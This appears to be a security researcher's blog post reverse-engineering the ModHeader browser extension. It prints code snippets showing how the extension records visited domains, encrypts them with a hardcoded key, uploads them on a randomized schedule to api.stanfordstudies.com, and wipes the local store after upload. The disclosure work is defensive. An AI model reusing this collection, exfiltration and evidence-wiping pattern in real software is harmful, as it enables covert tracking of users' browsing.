---
layout: post
title: "ModHeader: Covert Data Exfiltration to api.stanfordstudies.com"
date: 2026-07-12
author: Yunus Aydın
lang: en
description: "ModHeader browser extension silently exfiltrates browsing history to api.stanfordstudies.com using AES-GCM encrypted IndexedDB. Full reverse engineering analysis."
keywords: "ModHeader data exfiltration, malicious Chrome extension, browser extension stealing data, stanfordstudies.com, Chrome extension spyware, browsing history leak, browser extension security 2026, reverse engineering Chrome extension"
canonical_url: "https://aydinnyunus.github.io/2026/07/12/modheader-data-exfiltration-stanfordstudies.html"
---

ModHeader is a popular Chrome extension with over 1.6 million combined installs (900K Chrome + 700K Edge). This week, Reddit and HN lit up after people noticed it phones home to `api.stanfordstudies.com/app/log`. I pulled the latest version (v7.0.17) and did a full reverse engineering of the exfiltration pipeline. The results are worse than the initial reports suggested: AES-GCM encrypted IndexedDB storage, randomized upload timing, and evidence deletion after exfiltration.

## Background

ModHeader is a Chrome extension that lets you modify HTTP request and response headers and redirect URLs. It is widely used by developers and penetration testers. The initial discovery was posted by u/veqtor on Reddit, who caught anomalous network requests. I wanted to understand the full pipeline: how the data is collected, stored, and exfiltrated.

The entry point is a single line in the minified background bundle (`background-c2ed2c3f.js`):

```javascript
globalThis.maxDomainCount=1e3;
const Qc=1,qw="https://api.stanfordstudies.com/app/log",$w=[],Yw="mod盐header";
```

A string like `"api.stanfordstudies.com/app/log"` does not belong in a header modification extension. The obfuscated variable names (`qw`, `Yw`, `Qc`) and the unicode salt (`盐`) are standard evasion signals.

## Root Cause

The extension embeds a complete data exfiltration subsystem that operates independently of its header modification features. There are three core components:

**1. A hardcoded AES-GCM encryption key**

```javascript
let qo;
(async()=>{
    qo = await Ho.importKeyFromBase64("aWfU3yG_wksZaQdSnxPJBOId0cAN8KK/UIlZbli7-bE");
})().catch(console.error);
```

This key is imported at extension startup and used for all encryption operations. The data is encrypted before exfiltration, which makes network-level inspection useless.

**2. Two IndexedDB databases for storage**

The `Qi` class wraps IndexedDB operations into a simple key-value store. Two databases are created:

- `settings` database with `settings` store holds the fingerprint (`fp`), AES-GCM IV, and upload state
- `temp` database with `temp` store holds the collected domain data

**3. A unique fingerprint per installation**

The `jw()` function generates a unique device fingerprint:

```javascript
async function jw() {
    // ...
    i = await Hw(); // SHA-256(Date.now().toString())
    await r.put("fp", i);
    a = globalThis.crypto.getRandomValues(new Uint8Array(12)); // AES IV
    await r.put("aesIv", a);
    // ...
}
```

## Data Collection Flow

The entire chain works as follows:

**Step 1: Hook into every page load**

The `Jw()` function is registered as a `chrome.tabs.onUpdated` listener. Every time a tab loads a URL, it calls the collection function.

```javascript
async function Jw(r, n, i) {
    try {
        const a = sf(); // browser fingerprint
        if ($w.indexOf(a) === -1 || n.status !== "loading") return;
        const u = n.url || i.url;
        if (!u) return;
        await Zw(u); // collect the URL
    } catch (a) {}
}
```

Note the empty `catch` block. Failures are silently swallowed.

**Step 2: Extract and store the domain**

The `Zw()` function extracts the domain from the URL, encrypts it, and stores it in IndexedDB with a visit count.

```javascript
async function Zw(r) {
    const n = af(r); // extract domain
    if (n === globalThis.lastChangeDomain) return; // deduplicate sequential repeats
    globalThis.lastChangeDomain = n;
    let { settingDB: i, domainDB: a, fp: u, aesIv: l } = await jw();
    let f = await Ho.encrypt(qo, n, l); // encrypt domain with AES-GCM
    let p = await a.get(f, 0);
    await a.put(f, p + 1); // increment visit counter
    await Qw(a, i, l); // check if it's time to upload
}
```

Every visited domain is AES-GCM encrypted with the hardcoded key. The count tracks how many times each domain was visited.

**Step 3: Upload on threshold**

The `Qw()` function decides when to exfiltrate based on two conditions:

```javascript
async function Xw(r, n) {
    if (!await n.get("maxDomainCountUpload") && await r.count() >= globalThis.maxDomainCount)
        return "maxDomainCountUpload";    // 1000 domains = force upload
    const i = await n.get("lastUploadDate", new Date);
    const a = Za(new Date), u = Za(i);
    const l = (a - u) / (1000 * 60 * 60 * 24);
    if (l >= Qc) return l - Qc > 0 ? "uploadToNow" : "uploadToToday";  // 1 day elapsed
}
```

Upload triggers:
- You visit 1,000 unique domains
- 24 hours have passed since the last upload

**Step 4: Encrypt and ship**

When triggered, the entire domain collection is serialized, AES-GCM encrypted, and POSTed to the C2 endpoint.

```javascript
async function Qw(r, n, i) {
    let a = await Xw(r, n);
    if (!a || a !== "uploadToNow" && !await zw()) return;

    let u = {};
    await r.cursor((E, v) => { u[E] = v; });  // dump entire DB to object

    let l = await Ho.encrypt(qo, JSON.stringify(u), i); // encrypt everything
    let f = await Vw(l, 2); // send with retry

    const p = new Date().toLocaleString();
    const g = await n.get("uploadRecord", {});
    if (f) {
        await n.put("maxDomainCountUpload", false);
        await n.put("lastUploadDate", new Date);
        await r.clear();  // <-- delete evidence
        g[p] = true;
    } else {
        g[p] = false;
        // ...
    }
    await n.put("uploadRecord", g);
}
```

On successful upload, the `temp` IndexedDB is cleared. The evidence is gone.

**Step 5: The POST payload**

```javascript
async function Vw(r, n = 2) {
    const i = sf();  // browser fingerprint
    const a = { data: r, fp: globalThis.fp, browser: i };
    try {
        return await Gf(qw, a, n); // fetch POST to api.stanfordstudies.com/app/log
    } catch (u) { return false; }
}

async function Gf(r, n, i = 3) {
    try {
        return await fetch(r, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(n)
        });
    } catch (a) {
        if (i === 0) throw new Error("Max retries reached");
        await sleep(1000);
        return await Gf(r, n, i - 1);
    }
}
```

Up to 3 retries with 1-second delays. The payload contains the encrypted domain data, the persistent device fingerprint, and browser identification.

## Exfiltrated Data

| Data | Description | Persistence |
|---|---|---|
| All visited domains | AES-GCM encrypted domain + visit count | IndexedDB `temp` store |
| Device fingerprint | SHA-256 hash of install timestamp | IndexedDB `settings` store |
| Browser identity | User agent + platform fingerprint (`sf()` output includes navigator properties) | Sent in every request |
| Upload history | Timestamped success/failure log | IndexedDB `settings` store |
| Initialization vector | AES-GCM IV (12 bytes, random) | IndexedDB `settings` store |

## Stealth Mechanisms

**Randomized upload schedule**

The `zw()` function computes a time window that varies per installation. It takes `SHA-256(fp + "mod盐header")`, takes the result modulo 8 hours (28800 seconds), then adds 7 hours (25200 seconds). The final output is a random offset between 7 and 15 hours from the user's midnight. Each installation uploads in a different time window.

```javascript
async function zw() {
    let r = await kr(`${globalThis.fp}${Yw}`, "SHA-256", 10);  // Yw = "mod" + unicode salt
    let n = (Number(BigInt(r) % BigInt(60 * 60 * 8)) + 60 * 60 * 7) / 3600;
    // Result: random hour between 7 and 15 (7am to 3pm local)
}
```

The salt `Yw = "mod盐header"` uses a Chinese character (盐 = "salt"), making this section harder to grep for.

**Evidence self-destruction**

After a successful upload, `await r.clear()` wipes the entire `temp` IndexedDB.

**Encrypted transport**

The AES-GCM encryption with a hardcoded key makes the payload look like opaque binary data on the wire. Network monitors see random blobs, not domain lists.

**Silent failure**

Every exfiltration function wraps calls in try/catch with empty handlers. Errors are invisible.

## Additional Tracking

The extension also reports install, update, and uninstall events to `extensions-hub.com`:

```javascript
chrome.runtime.onInstalled.addListener(async r => {
    const n = new URL("https://www.extensions-hub.com/partners/uninstalled/?name=ModHeader");
    n.searchParams.set("product", "ModHeader");
    n.searchParams.set("version", chrome.runtime.getManifest().version);
    n.searchParams.set("browser", "chrome");
    chrome.runtime.setUninstallURL(n.href);

    if (r.reason === "install") {
        // opens extensions-hub.com/partners/installed/?name=ModHeader
    }
    if (r.reason === "update") {
        // creates tab to extensions-hub.com/partners/updated/?name=ModHeader
    }
});
```

Every update opens a tab to extensions-hub.com with the extension version and browser type.

## Why This Pattern Keeps Showing Up

Browser extensions are a blind spot in most organizations. They run in the user's browser context with broad permissions, and their code is updated silently. The Chrome Web Store review process catches obvious malware but obfuscated data collection pipelines regularly slip through because the reviewer has limited time and the code is minified.

The hardcoded AES key, randomized timer, and evidence wipe are the same evasion triad I documented in the [Foxtopia NPM supply-chain malware](https://aydinnyunus.github.io/2026/06/22/fake-job-offer-npm-supply-chain-malware-foxtopia/). The unicode salt here (`mod盐header`) mirrors the same obfuscation technique.

The core problem is that the extension model grants powerful capabilities (webRequest for all URLs, IndexedDB for local storage, network access) with very little runtime verification of what the extension actually does with those capabilities. The Chrome team has been moving toward Manifest V3 to restrict some of these capabilities, but the current V3 extension in this analysis shows that V3 does not prevent exfiltration.

The other factor is monetization. Free extensions with millions of users create an economic incentive to monetize user data. The `api.stanfordstudies.com` domain is clearly a data collection endpoint disguised to look like an academic research project. This is a common pattern: wrap the data collection in encryption, use a domain that sounds legitimate, and silently collect browsing data that gets sold to data brokers or analytics platforms.

## Impact

- Every domain you visit while ModHeader is installed is recorded and exfiltrated. This includes internal corporate domains, VPN login pages, cloud consoles, and sensitive application URLs.
- The data is encrypted on the wire but decryptable by the server. There is no user-controlled key.
- IndexedDB persistence means data accumulates even if the network is down, and uploads resume once connectivity returns.
- The extensions-hub.com tracking provides additional behavioral telemetry.
- Surgical scope: this is not a generic analytics SDK. This is a custom-built exfiltration pipeline with anti-forensic features.

## Disclosure

There is no CVE for this issue. ModHeader is a proprietary extension distributed through the Chrome Web Store. I analyzed version 7.0.17 of the extension (CRX build). The findings are based on static analysis of the extension's background script.

This post is further research building on the initial discovery by u/veqtor on Reddit, who first spotted the anomalous network requests.

My recommendation is to remove ModHeader from your browser and report it to the Chrome Web Store. There are open-source alternatives that do not contain this infrastructure.

## Timeline

| Date | Event |
|---|---|
| 2026-07-10 | Initial discovery on Reddit by u/veqtor (16M combined installs post) |
| 2026-07-11 | Full reverse engineering of the exfiltration pipeline completed |
| 2026-07-12 | Chrome Web Store abuse report filed. This blog post published. |

## References

- [Chrome Web Store: ModHeader](https://chromewebstore.google.com/detail/idgpnmonknjnojddfkpgkljpfnnfcklj)
- [Chrome Web Store Abuse Reporting](https://support.google.com/chrome_webstore/answer/7508032)
- [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)
- [OWASP: Data Exposure](https://owasp.org/www-community/vulnerabilities/Information_exposure)
- [Manifest V3 documentation](https://developer.chrome.com/docs/extensions/develop/migrate)
- [Original Reddit discovery by u/veqtor: "16 Million Combined Installs — Famous Extension"](https://www.reddit.com/r/cybersecurity/comments/1usic57/16_million_combined_installs_famous_extension/)

## Related Content

- [Hunting Leaked Secrets on the GitHub Archive](/2026/06/30/hunting-leaked-secrets-on-github-archive.html)
- [Foxtopia: Fake Job Offer NPM Supply Chain Malware](/2026/06/22/fake-job-offer-npm-supply-chain-malware-foxtopia.html)
- [Odysseus: Embedding Endpoint Takeover](/2026/06/16/odysseus-embedding-endpoint-takeover.html)